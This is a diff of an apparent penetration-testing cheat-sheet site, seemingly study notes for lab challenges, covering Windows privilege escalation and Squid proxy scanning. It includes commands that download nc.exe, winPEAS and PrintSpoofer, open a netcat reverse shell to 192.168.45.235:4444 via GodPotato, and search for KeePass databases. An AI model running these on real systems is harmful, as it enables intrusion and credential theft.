@@ -957,6 +957,17 @@
 </li>
         
           <li class="md-nav__item">
+  <a href="#execute-as-other-user" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Execute as other user
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
   <a href="#windows-services" class="md-nav__link">
     <span class="md-ellipsis">
       
@@ -1577,6 +1588,45 @@
 </li>
         
           <li class="md-nav__item">
+  <a href="#squid-proxy-tcp-3128" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Squid Proxy (TCP: 3128)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Squid Proxy (TCP: 3128)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#services" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Services
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#proxying" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Proxying
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
   <a href="#winrm-tcp-59855986" class="md-nav__link">
     <span class="md-ellipsis">
       
@@ -1643,15 +1693,15 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#reverse-shells" class="md-nav__link">
+  <a href="#web-and-reverse-shells" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Reverse Shells
+        Web and Reverse Shells
       
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="Reverse Shells">
+    <nav class="md-nav" aria-label="Web and Reverse Shells">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
@@ -2758,6 +2808,17 @@
 </li>
         
           <li class="md-nav__item">
+  <a href="#execute-as-other-user" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Execute as other user
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
   <a href="#windows-services" class="md-nav__link">
     <span class="md-ellipsis">
       
@@ -3378,6 +3439,45 @@
 </li>
         
           <li class="md-nav__item">
+  <a href="#squid-proxy-tcp-3128" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Squid Proxy (TCP: 3128)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Squid Proxy (TCP: 3128)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#services" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Services
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#proxying" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Proxying
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
   <a href="#winrm-tcp-59855986" class="md-nav__link">
     <span class="md-ellipsis">
       
@@ -3444,15 +3544,15 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#reverse-shells" class="md-nav__link">
+  <a href="#web-and-reverse-shells" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Reverse Shells
+        Web and Reverse Shells
       
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="Reverse Shells">
+    <nav class="md-nav" aria-label="Web and Reverse Shells">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
@@ -3917,60 +4017,67 @@
 </span><span id="__span-17-4"><a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a>find<span class="w"> </span>/<span class="w"> </span>-perm<span class="w"> </span>-g<span class="o">=</span>s<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span><span class="s2">"/snap"</span>
 </span></code></pre></div>
 <h4 id="windows">Windows<a class="headerlink" href="#windows" title="Permanent link">¶</a></h4>
-<div class="language-sh highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="c1"># Run cmd as other user (need password)</span>
-</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>runas<span class="w"> </span>/user:USER<span class="w"> </span>cmd
-</span></code></pre></div>
 <h5 id="enumeration_1">Enumeration<a class="headerlink" href="#enumeration_1" title="Permanent link">¶</a></h5>
-<div class="language-ps1 highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="c"># Username and hostname</span>
-</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a><span class="n">whoami</span>
-</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a><span class="c"># Groups user is member of</span>
-</span><span id="__span-19-4"><a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a><span class="n">whoami</span> <span class="p">/</span><span class="n">groups</span>
-</span><span id="__span-19-5"><a id="__codelineno-19-5" name="__codelineno-19-5" href="#__codelineno-19-5"></a><span class="c"># Other users</span>
-</span><span id="__span-19-6"><a id="__codelineno-19-6" name="__codelineno-19-6" href="#__codelineno-19-6"></a><span class="n">net</span> <span class="n">user</span>
-</span><span id="__span-19-7"><a id="__codelineno-19-7" name="__codelineno-19-7" href="#__codelineno-19-7"></a><span class="nb">Get-LocalUser</span>
-</span><span id="__span-19-8"><a id="__codelineno-19-8" name="__codelineno-19-8" href="#__codelineno-19-8"></a><span class="n">net</span> <span class="n">user</span> <span class="n">USERNAME</span>
-</span><span id="__span-19-9"><a id="__codelineno-19-9" name="__codelineno-19-9" href="#__codelineno-19-9"></a><span class="c"># Other groups</span>
-</span><span id="__span-19-10"><a id="__codelineno-19-10" name="__codelineno-19-10" href="#__codelineno-19-10"></a><span class="n">net</span> <span class="n">localgroup</span>
-</span><span id="__span-19-11"><a id="__codelineno-19-11" name="__codelineno-19-11" href="#__codelineno-19-11"></a><span class="nb">Get-LocalGroup</span>
-</span><span id="__span-19-12"><a id="__codelineno-19-12" name="__codelineno-19-12" href="#__codelineno-19-12"></a><span class="c"># Group members</span>
-</span><span id="__span-19-13"><a id="__codelineno-19-13" name="__codelineno-19-13" href="#__codelineno-19-13"></a><span class="nb">Get-LocalGroupMember</span> <span class="n">GROUPNAME</span>
-</span><span id="__span-19-14"><a id="__codelineno-19-14" name="__codelineno-19-14" href="#__codelineno-19-14"></a>
-</span><span id="__span-19-15"><a id="__codelineno-19-15" name="__codelineno-19-15" href="#__codelineno-19-15"></a><span class="c"># System info</span>
-</span><span id="__span-19-16"><a id="__codelineno-19-16" name="__codelineno-19-16" href="#__codelineno-19-16"></a><span class="n">systeminfo</span>
-</span><span id="__span-19-17"><a id="__codelineno-19-17" name="__codelineno-19-17" href="#__codelineno-19-17"></a><span class="c"># Network info</span>
-</span><span id="__span-19-18"><a id="__codelineno-19-18" name="__codelineno-19-18" href="#__codelineno-19-18"></a><span class="n">ipconfig</span> <span class="p">/</span><span class="n">all</span>
-</span><span id="__span-19-19"><a id="__codelineno-19-19" name="__codelineno-19-19" href="#__codelineno-19-19"></a><span class="n">route</span> <span class="n">print</span>
-</span><span id="__span-19-20"><a id="__codelineno-19-20" name="__codelineno-19-20" href="#__codelineno-19-20"></a><span class="n">netstat</span> <span class="n">-ano</span>
-</span><span id="__span-19-21"><a id="__codelineno-19-21" name="__codelineno-19-21" href="#__codelineno-19-21"></a><span class="c"># Installed apps (32/64 bit)</span>
-</span><span id="__span-19-22"><a id="__codelineno-19-22" name="__codelineno-19-22" href="#__codelineno-19-22"></a><span class="nb">Get-ItemProperty</span> <span class="s2">"HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*"</span> <span class="p">|</span> <span class="nb">select </span><span class="n">displayname</span>
-</span><span id="__span-19-23"><a id="__codelineno-19-23" name="__codelineno-19-23" href="#__codelineno-19-23"></a><span class="nb">Get-ItemProperty</span> <span class="s2">"HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*"</span> <span class="p">|</span> <span class="nb">select </span><span class="n">displayname</span>
-</span><span id="__span-19-24"><a id="__codelineno-19-24" name="__codelineno-19-24" href="#__codelineno-19-24"></a><span class="n">C</span><span class="p">:\</span><span class="n">Program</span> <span class="n">Files</span>
-</span><span id="__span-19-25"><a id="__codelineno-19-25" name="__codelineno-19-25" href="#__codelineno-19-25"></a><span class="n">C</span><span class="p">:\</span><span class="n">Program</span> <span class="n">Files</span> <span class="p">(</span><span class="n">x86</span><span class="p">)</span>
-</span><span id="__span-19-26"><a id="__codelineno-19-26" name="__codelineno-19-26" href="#__codelineno-19-26"></a><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\*\</span><span class="n">Downloads</span>
-</span><span id="__span-19-27"><a id="__codelineno-19-27" name="__codelineno-19-27" href="#__codelineno-19-27"></a><span class="c"># Processes</span>
-</span><span id="__span-19-28"><a id="__codelineno-19-28" name="__codelineno-19-28" href="#__codelineno-19-28"></a><span class="nb">Get-Process</span>
-</span><span id="__span-19-29"><a id="__codelineno-19-29" name="__codelineno-19-29" href="#__codelineno-19-29"></a>
-</span><span id="__span-19-30"><a id="__codelineno-19-30" name="__codelineno-19-30" href="#__codelineno-19-30"></a><span class="c"># Interesting files / folders</span>
-</span><span id="__span-19-31"><a id="__codelineno-19-31" name="__codelineno-19-31" href="#__codelineno-19-31"></a><span class="c"># Keepass DBs</span>
-</span><span id="__span-19-32"><a id="__codelineno-19-32" name="__codelineno-19-32" href="#__codelineno-19-32"></a><span class="nb">Get-ChildItem</span> <span class="n">-Path</span> <span class="n">C</span><span class="p">:\</span> <span class="n">-Include</span> <span class="p">*.</span><span class="n">kdbx</span> <span class="o">-File</span> <span class="n">-Recurse</span> <span class="n">-ErrorAction</span> <span class="n">SilentlyContinue</span>
-</span><span id="__span-19-33"><a id="__codelineno-19-33" name="__codelineno-19-33" href="#__codelineno-19-33"></a><span class="c"># XAMMP config files</span>
-</span><span id="__span-19-34"><a id="__codelineno-19-34" name="__codelineno-19-34" href="#__codelineno-19-34"></a><span class="nb">Get-ChildItem</span> <span class="n">-Path</span> <span class="n">C</span><span class="p">:\</span><span class="n">xampp</span> <span class="n">-Include</span> <span class="p">*.</span><span class="n">txt</span><span class="p">,*.</span><span class="n">ini</span> <span class="o">-File</span> <span class="n">-Recurse</span> <span class="n">-ErrorAction</span> <span class="n">SilentlyContinue</span>
-</span><span id="__span-19-35"><a id="__codelineno-19-35" name="__codelineno-19-35" href="#__codelineno-19-35"></a><span class="c"># Home directory documents</span>
-</span><span id="__span-19-36"><a id="__codelineno-19-36" name="__codelineno-19-36" href="#__codelineno-19-36"></a><span class="nb">Get-ChildItem</span> <span class="n">-Path</span> <span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">dave</span><span class="p">\</span> <span class="n">-Include</span> <span class="p">*.</span><span class="n">txt</span><span class="p">,*.</span><span class="n">pdf</span><span class="p">,*.</span><span class="n">xls</span><span class="p">,*.</span><span class="n">xlsx</span><span class="p">,*.</span><span class="n">doc</span><span class="p">,*.</span><span class="n">docx</span> <span class="o">-File</span> <span class="n">-Recurse</span> <span class="n">-ErrorAction</span> <span class="n">SilentlyContinue</span>
-</span><span id="__span-19-37"><a id="__codelineno-19-37" name="__codelineno-19-37" href="#__codelineno-19-37"></a>
-</span><span id="__span-19-38"><a id="__codelineno-19-38" name="__codelineno-19-38" href="#__codelineno-19-38"></a><span class="c"># PowerShell</span>
-</span><span id="__span-19-39"><a id="__codelineno-19-39" name="__codelineno-19-39" href="#__codelineno-19-39"></a><span class="c"># User command history</span>
-</span><span id="__span-19-40"><a id="__codelineno-19-40" name="__codelineno-19-40" href="#__codelineno-19-40"></a><span class="nb">Get-History</span>
-</span><span id="__span-19-41"><a id="__codelineno-19-41" name="__codelineno-19-41" href="#__codelineno-19-41"></a><span class="p">(</span><span class="nb">Get-PSReadlineOption</span><span class="p">).</span><span class="n">HistorySavePath</span>
-</span><span id="__span-19-42"><a id="__codelineno-19-42" name="__codelineno-19-42" href="#__codelineno-19-42"></a><span class="c"># Create WinRM session</span>
-</span><span id="__span-19-43"><a id="__codelineno-19-43" name="__codelineno-19-43" href="#__codelineno-19-43"></a><span class="n">evil-winrm</span> <span class="n">-i</span> <span class="n">IP</span> <span class="n">-u</span> <span class="n">USER</span> <span class="n">-p</span> <span class="s2">"PASS"</span>
-</span><span id="__span-19-44"><a id="__codelineno-19-44" name="__codelineno-19-44" href="#__codelineno-19-44"></a>
-</span><span id="__span-19-45"><a id="__codelineno-19-45" name="__codelineno-19-45" href="#__codelineno-19-45"></a><span class="c"># WinPEAS</span>
-</span><span id="__span-19-46"><a id="__codelineno-19-46" name="__codelineno-19-46" href="#__codelineno-19-46"></a><span class="c"># Serve winPEAS from home directory and download</span>
-</span><span id="__span-19-47"><a id="__codelineno-19-47" name="__codelineno-19-47" href="#__codelineno-19-47"></a><span class="nb">cp </span><span class="p">/</span><span class="n">usr</span><span class="p">/</span><span class="n">share</span><span class="p">/</span><span class="n">peass</span><span class="p">/</span><span class="n">winpeas</span><span class="p">/</span><span class="n">winPEASx64</span><span class="p">.</span><span class="n">exe</span> <span class="p">.</span>
-</span><span id="__span-19-48"><a id="__codelineno-19-48" name="__codelineno-19-48" href="#__codelineno-19-48"></a><span class="n">python3</span> <span class="n">-m</span> <span class="n">http</span><span class="p">.</span><span class="n">server</span> <span class="n">80</span>
-</span><span id="__span-19-49"><a id="__codelineno-19-49" name="__codelineno-19-49" href="#__codelineno-19-49"></a><span class="nb">iwr </span><span class="n">-uri</span> <span class="n">http</span><span class="p">://</span><span class="n">IP</span><span class="p">/</span><span class="n">winPEASx64</span><span class="p">.</span><span class="n">exe</span> <span class="n">-Outfile</span> <span class="n">winPEAS</span><span class="p">.</span><span class="n">exe</span>
-</span><span id="__span-19-50"><a id="__codelineno-19-50" name="__codelineno-19-50" href="#__codelineno-19-50"></a><span class="p">.\</span><span class="n">winPEAS</span><span class="p">.</span><span class="n">exe</span>
+<div class="language-ps1 highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="c"># Username and hostname</span>
+</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a><span class="n">whoami</span>
+</span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a><span class="c"># Privileges</span>
+</span><span id="__span-18-4"><a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a><span class="n">whoami</span> <span class="p">/</span><span class="n">priv</span>
+</span><span id="__span-18-5"><a id="__codelineno-18-5" name="__codelineno-18-5" href="#__codelineno-18-5"></a><span class="c"># Groups user is member of</span>
+</span><span id="__span-18-6"><a id="__codelineno-18-6" name="__codelineno-18-6" href="#__codelineno-18-6"></a><span class="n">whoami</span> <span class="p">/</span><span class="n">groups</span>
+</span><span id="__span-18-7"><a id="__codelineno-18-7" name="__codelineno-18-7" href="#__codelineno-18-7"></a><span class="c"># Other users</span>
+</span><span id="__span-18-8"><a id="__codelineno-18-8" name="__codelineno-18-8" href="#__codelineno-18-8"></a><span class="n">net</span> <span class="n">user</span>
+</span><span id="__span-18-9"><a id="__codelineno-18-9" name="__codelineno-18-9" href="#__codelineno-18-9"></a><span class="nb">Get-LocalUser</span>
+</span><span id="__span-18-10"><a id="__codelineno-18-10" name="__codelineno-18-10" href="#__codelineno-18-10"></a><span class="n">net</span> <span class="n">user</span> <span class="n">USERNAME</span>
+</span><span id="__span-18-11"><a id="__codelineno-18-11" name="__codelineno-18-11" href="#__codelineno-18-11"></a><span class="c"># Other groups</span>
+</span><span id="__span-18-12"><a id="__codelineno-18-12" name="__codelineno-18-12" href="#__codelineno-18-12"></a><span class="n">net</span> <span class="n">localgroup</span>
+</span><span id="__span-18-13"><a id="__codelineno-18-13" name="__codelineno-18-13" href="#__codelineno-18-13"></a><span class="nb">Get-LocalGroup</span>
+</span><span id="__span-18-14"><a id="__codelineno-18-14" name="__codelineno-18-14" href="#__codelineno-18-14"></a><span class="c"># Group members</span>
+</span><span id="__span-18-15"><a id="__codelineno-18-15" name="__codelineno-18-15" href="#__codelineno-18-15"></a><span class="nb">Get-LocalGroupMember</span> <span class="n">GROUPNAME</span>
+</span><span id="__span-18-16"><a id="__codelineno-18-16" name="__codelineno-18-16" href="#__codelineno-18-16"></a>
+</span><span id="__span-18-17"><a id="__codelineno-18-17" name="__codelineno-18-17" href="#__codelineno-18-17"></a><span class="c"># System info</span>
+</span><span id="__span-18-18"><a id="__codelineno-18-18" name="__codelineno-18-18" href="#__codelineno-18-18"></a><span class="n">systeminfo</span>
+</span><span id="__span-18-19"><a id="__codelineno-18-19" name="__codelineno-18-19" href="#__codelineno-18-19"></a><span class="c"># Always look in any specific service folders related to the challenge</span>
+</span><span id="__span-18-20"><a id="__codelineno-18-20" name="__codelineno-18-20" href="#__codelineno-18-20"></a><span class="p">../*</span><span class="n">config</span><span class="p">*</span>
+</span><span id="__span-18-21"><a id="__codelineno-18-21" name="__codelineno-18-21" href="#__codelineno-18-21"></a><span class="p">../*</span><span class="n">users</span><span class="p">*</span>
+</span><span id="__span-18-22"><a id="__codelineno-18-22" name="__codelineno-18-22" href="#__codelineno-18-22"></a><span class="n">etc</span>
+</span><span id="__span-18-23"><a id="__codelineno-18-23" name="__codelineno-18-23" href="#__codelineno-18-23"></a><span class="c"># Network info</span>
+</span><span id="__span-18-24"><a id="__codelineno-18-24" name="__codelineno-18-24" href="#__codelineno-18-24"></a><span class="n">ipconfig</span> <span class="p">/</span><span class="n">all</span>
+</span><span id="__span-18-25"><a id="__codelineno-18-25" name="__codelineno-18-25" href="#__codelineno-18-25"></a><span class="n">route</span> <span class="n">print</span>
+</span><span id="__span-18-26"><a id="__codelineno-18-26" name="__codelineno-18-26" href="#__codelineno-18-26"></a><span class="n">netstat</span> <span class="n">-ano</span>
+</span><span id="__span-18-27"><a id="__codelineno-18-27" name="__codelineno-18-27" href="#__codelineno-18-27"></a><span class="c"># Installed apps (32/64 bit)</span>
+</span><span id="__span-18-28"><a id="__codelineno-18-28" name="__codelineno-18-28" href="#__codelineno-18-28"></a><span class="nb">Get-ItemProperty</span> <span class="s2">"HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*"</span> <span class="p">|</span> <span class="nb">select </span><span class="n">displayname</span>
+</span><span id="__span-18-29"><a id="__codelineno-18-29" name="__codelineno-18-29" href="#__codelineno-18-29"></a><span class="nb">Get-ItemProperty</span> <span class="s2">"HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*"</span> <span class="p">|</span> <span class="nb">select </span><span class="n">displayname</span>
+</span><span id="__span-18-30"><a id="__codelineno-18-30" name="__codelineno-18-30" href="#__codelineno-18-30"></a><span class="n">C</span><span class="p">:\</span><span class="n">Program</span> <span class="n">Files</span>
+</span><span id="__span-18-31"><a id="__codelineno-18-31" name="__codelineno-18-31" href="#__codelineno-18-31"></a><span class="n">C</span><span class="p">:\</span><span class="n">Program</span> <span class="n">Files</span> <span class="p">(</span><span class="n">x86</span><span class="p">)</span>
+</span><span id="__span-18-32"><a id="__codelineno-18-32" name="__codelineno-18-32" href="#__codelineno-18-32"></a><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\*\</span><span class="n">Downloads</span>
+</span><span id="__span-18-33"><a id="__codelineno-18-33" name="__codelineno-18-33" href="#__codelineno-18-33"></a><span class="c"># Processes</span>
+</span><span id="__span-18-34"><a id="__codelineno-18-34" name="__codelineno-18-34" href="#__codelineno-18-34"></a><span class="nb">Get-Process</span>
+</span><span id="__span-18-35"><a id="__codelineno-18-35" name="__codelineno-18-35" href="#__codelineno-18-35"></a>
+</span><span id="__span-18-36"><a id="__codelineno-18-36" name="__codelineno-18-36" href="#__codelineno-18-36"></a><span class="c"># Interesting files / folders</span>
+</span><span id="__span-18-37"><a id="__codelineno-18-37" name="__codelineno-18-37" href="#__codelineno-18-37"></a><span class="c"># Keepass DBs</span>
+</span><span id="__span-18-38"><a id="__codelineno-18-38" name="__codelineno-18-38" href="#__codelineno-18-38"></a><span class="nb">Get-ChildItem</span> <span class="n">-Path</span> <span class="n">C</span><span class="p">:\</span> <span class="n">-Include</span> <span class="p">*.</span><span class="n">kdbx</span> <span class="o">-File</span> <span class="n">-Recurse</span> <span class="n">-ErrorAction</span> <span class="n">SilentlyContinue</span>
+</span><span id="__span-18-39"><a id="__codelineno-18-39" name="__codelineno-18-39" href="#__codelineno-18-39"></a><span class="c"># XAMMP config files</span>
+</span><span id="__span-18-40"><a id="__codelineno-18-40" name="__codelineno-18-40" href="#__codelineno-18-40"></a><span class="nb">Get-ChildItem</span> <span class="n">-Path</span> <span class="n">C</span><span class="p">:\</span><span class="n">xampp</span> <span class="n">-Include</span> <span class="p">*.</span><span class="n">txt</span><span class="p">,*.</span><span class="n">ini</span> <span class="o">-File</span> <span class="n">-Recurse</span> <span class="n">-ErrorAction</span> <span class="n">SilentlyContinue</span>
+</span><span id="__span-18-41"><a id="__codelineno-18-41" name="__codelineno-18-41" href="#__codelineno-18-41"></a><span class="c"># Home directory documents</span>
+</span><span id="__span-18-42"><a id="__codelineno-18-42" name="__codelineno-18-42" href="#__codelineno-18-42"></a><span class="nb">Get-ChildItem</span> <span class="n">-Path</span> <span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">dave</span><span class="p">\</span> <span class="n">-Include</span> <span class="p">*.</span><span class="n">txt</span><span class="p">,*.</span><span class="n">pdf</span><span class="p">,*.</span><span class="n">xls</span><span class="p">,*.</span><span class="n">xlsx</span><span class="p">,*.</span><span class="n">doc</span><span class="p">,*.</span><span class="n">docx</span> <span class="o">-File</span> <span class="n">-Recurse</span> <span class="n">-ErrorAction</span> <span class="n">SilentlyContinue</span>
+</span><span id="__span-18-43"><a id="__codelineno-18-43" name="__codelineno-18-43" href="#__codelineno-18-43"></a>
+</span><span id="__span-18-44"><a id="__codelineno-18-44" name="__codelineno-18-44" href="#__codelineno-18-44"></a><span class="c"># PowerShell</span>
+</span><span id="__span-18-45"><a id="__codelineno-18-45" name="__codelineno-18-45" href="#__codelineno-18-45"></a><span class="c"># User command history</span>
+</span><span id="__span-18-46"><a id="__codelineno-18-46" name="__codelineno-18-46" href="#__codelineno-18-46"></a><span class="nb">Get-History</span>
+</span><span id="__span-18-47"><a id="__codelineno-18-47" name="__codelineno-18-47" href="#__codelineno-18-47"></a><span class="p">(</span><span class="nb">Get-PSReadlineOption</span><span class="p">).</span><span class="n">HistorySavePath</span>
+</span><span id="__span-18-48"><a id="__codelineno-18-48" name="__codelineno-18-48" href="#__codelineno-18-48"></a><span class="c"># Create WinRM session</span>
+</span><span id="__span-18-49"><a id="__codelineno-18-49" name="__codelineno-18-49" href="#__codelineno-18-49"></a><span class="n">evil-winrm</span> <span class="n">-i</span> <span class="n">IP</span> <span class="n">-u</span> <span class="n">USER</span> <span class="n">-p</span> <span class="s2">"PASS"</span>
+</span><span id="__span-18-50"><a id="__codelineno-18-50" name="__codelineno-18-50" href="#__codelineno-18-50"></a>
+</span><span id="__span-18-51"><a id="__codelineno-18-51" name="__codelineno-18-51" href="#__codelineno-18-51"></a><span class="c"># WinPEAS</span>
+</span><span id="__span-18-52"><a id="__codelineno-18-52" name="__codelineno-18-52" href="#__codelineno-18-52"></a><span class="c"># Serve winPEAS from home directory and download</span>
+</span><span id="__span-18-53"><a id="__codelineno-18-53" name="__codelineno-18-53" href="#__codelineno-18-53"></a><span class="nb">cp </span><span class="p">/</span><span class="n">usr</span><span class="p">/</span><span class="n">share</span><span class="p">/</span><span class="n">peass</span><span class="p">/</span><span class="n">winpeas</span><span class="p">/</span><span class="n">winPEASx64</span><span class="p">.</span><span class="n">exe</span> <span class="p">.</span>
+</span><span id="__span-18-54"><a id="__codelineno-18-54" name="__codelineno-18-54" href="#__codelineno-18-54"></a><span class="n">python3</span> <span class="n">-m</span> <span class="n">http</span><span class="p">.</span><span class="n">server</span> <span class="n">80</span>
+</span><span id="__span-18-55"><a id="__codelineno-18-55" name="__codelineno-18-55" href="#__codelineno-18-55"></a><span class="nb">iwr </span><span class="n">-uri</span> <span class="n">http</span><span class="p">://</span><span class="n">IP</span><span class="p">/</span><span class="n">winPEASx64</span><span class="p">.</span><span class="n">exe</span> <span class="n">-Outfile</span> <span class="n">winPEAS</span><span class="p">.</span><span class="n">exe</span>
+</span><span id="__span-18-56"><a id="__codelineno-18-56" name="__codelineno-18-56" href="#__codelineno-18-56"></a><span class="p">.\</span><span class="n">winPEAS</span><span class="p">.</span><span class="n">exe</span>
+</span></code></pre></div>
+<h5 id="execute-as-other-user">Execute as other user<a class="headerlink" href="#execute-as-other-user" title="Permanent link">¶</a></h5>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="c1"># Run cmd as other user (need password)</span>
+</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>runas<span class="w"> </span>/user:USER<span class="w"> </span>cmd
 </span></code></pre></div>
 <h5 id="windows-services">Windows Services<a class="headerlink" href="#windows-services" title="Permanent link">¶</a></h5>
 <div class="language-ps1 highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="c"># List services</span>
@@ -4092,6 +4199,10 @@
 </span><span id="__span-24-10"><a id="__codelineno-24-10" name="__codelineno-24-10" href="#__codelineno-24-10"></a><span class="c"># Get netcat for reverse shell</span>
 </span><span id="__span-24-11"><a id="__codelineno-24-11" name="__codelineno-24-11" href="#__codelineno-24-11"></a><span class="n">certutil</span> <span class="n">-urlcache</span> <span class="n">-split</span> <span class="o">-f</span> <span class="n">http</span><span class="p">://</span><span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">45</span><span class="p">.</span><span class="n">235</span><span class="p">/</span><span class="n">nc</span><span class="p">.</span><span class="n">exe</span>
 </span><span id="__span-24-12"><a id="__codelineno-24-12" name="__codelineno-24-12" href="#__codelineno-24-12"></a><span class="p">.\</span><span class="n">GodPotato-NET4</span><span class="p">.</span><span class="n">exe</span> <span class="n">-cmd</span> <span class="s2">"nc.exe 192.168.45.235 4444 -e cmd"</span>
+</span><span id="__span-24-13"><a id="__codelineno-24-13" name="__codelineno-24-13" href="#__codelineno-24-13"></a>
+</span><span id="__span-24-14"><a id="__codelineno-24-14" name="__codelineno-24-14" href="#__codelineno-24-14"></a><span class="c"># PrintSpoofer (alternative)</span>
+</span><span id="__span-24-15"><a id="__codelineno-24-15" name="__codelineno-24-15" href="#__codelineno-24-15"></a><span class="nb">iwr </span><span class="n">-uri</span> <span class="n">http</span><span class="p">://</span><span class="n">IP</span><span class="p">/</span><span class="n">PrintSpoofer64</span><span class="p">.</span><span class="n">exe</span> <span class="n">-Outfile</span> <span class="n">PrintSpoofer64</span><span class="p">.</span><span class="n">exe</span>
+</span><span id="__span-24-16"><a id="__codelineno-24-16" name="__codelineno-24-16" href="#__codelineno-24-16"></a><span class="n">PrintSpoofer64</span><span class="p">.</span><span class="n">exe</span> <span class="n">-i</span> <span class="n">-c</span> <span class="s2">"cmd /c cmd.exe"</span>
 </span></code></pre></div>
 <h5 id="code-samples">Code Samples<a class="headerlink" href="#code-samples" title="Permanent link">¶</a></h5>
 <div class="language-c highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a><span class="c1">// Code to replace service binary with</span>
@@ -4473,197 +4584,226 @@
 </span><span id="__span-61-3"><a id="__codelineno-61-3" name="__codelineno-61-3" href="#__codelineno-61-3"></a><span class="c1"># Confirm credential</span>
 </span><span id="__span-61-4"><a id="__codelineno-61-4" name="__codelineno-61-4" href="#__codelineno-61-4"></a>netexec<span class="w"> </span>ldap<span class="w"> </span>IP<span class="w"> </span>-u<span class="w"> </span>Administrator<span class="w"> </span>-p<span class="w"> </span><span class="s1">'PASSWORD'</span>
 </span></code></pre></div>
+<h4 id="squid-proxy-tcp-3128">Squid Proxy (TCP: 3128)<a class="headerlink" href="#squid-proxy-tcp-3128" title="Permanent link">¶</a></h4>
+<h5 id="services">Services<a class="headerlink" href="#services" title="Permanent link">¶</a></h5>
+<div class="language-sh highlight"><pre><span></span><code><span id="__span-62-1"><a id="__codelineno-62-1" name="__codelineno-62-1" href="#__codelineno-62-1"></a><span class="c1"># Find open ports on proxy itself</span>
+</span><span id="__span-62-2"><a id="__codelineno-62-2" name="__codelineno-62-2" href="#__codelineno-62-2"></a><span class="c1"># Spose</span>
+</span><span id="__span-62-3"><a id="__codelineno-62-3" name="__codelineno-62-3" href="#__codelineno-62-3"></a>python<span class="w"> </span>spose.py<span class="w"> </span>--proxy<span class="w"> </span>http://IP:3128<span class="w"> </span>--target<span class="w"> </span>IP<span class="w"> </span>-allports
+</span><span id="__span-62-4"><a id="__codelineno-62-4" name="__codelineno-62-4" href="#__codelineno-62-4"></a><span class="c1"># Nmap (results not always consistent with other tools)</span>
+</span><span id="__span-62-5"><a id="__codelineno-62-5" name="__codelineno-62-5" href="#__codelineno-62-5"></a>nmap<span class="w"> </span>-Pn<span class="w"> </span>-sV<span class="w"> </span>-p<span class="w"> </span><span class="m">3128</span><span class="w"> </span>--script<span class="w"> </span>http-open-proxy<span class="w"> </span>IP
